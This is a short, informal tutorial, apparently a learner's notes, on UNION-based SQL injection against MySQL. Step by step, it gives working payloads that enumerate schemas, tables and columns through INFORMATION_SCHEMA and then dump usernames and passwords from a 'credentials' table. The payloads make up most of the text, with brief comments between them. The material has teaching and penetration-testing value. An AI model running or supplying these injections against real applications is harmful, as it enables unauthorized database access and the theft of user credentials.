we can discover the databases and table names using the following injections 

(since we are using a union injection we first need to find the amount of collumns in the table by using junk data (null,null,null.....))

to find the database names we can use this injection: 

```sql
' UNION select null,schema_name,null,null from INFORMATION_SCHEMA.SCHEMATA-- -
```

this (if the number of collumns is correct) should reveal the database names 

we can the current database we are in by using:

```sql
' UNION select null,database(),null,null-- -
```

if we find a database that we are interested in we can determin the table names by using an injection like: 

```sql
' UNION select null,TABLE_NAME,TABLE_SCHEMA,null from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

(this would be for a database called "dev")

after we determin the tables we need to find the collumns 

this will show us the collumn names for the selected table name (in this case "credentials"):

```sql
' UNION select null,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

now that we know all the details we can retrieve the information from the collumns we found (username ; password) using this:

```sql
' UNION select null, username, password, null from dev.credentials-- -
```

(from the database "dev" and the table "credentials")
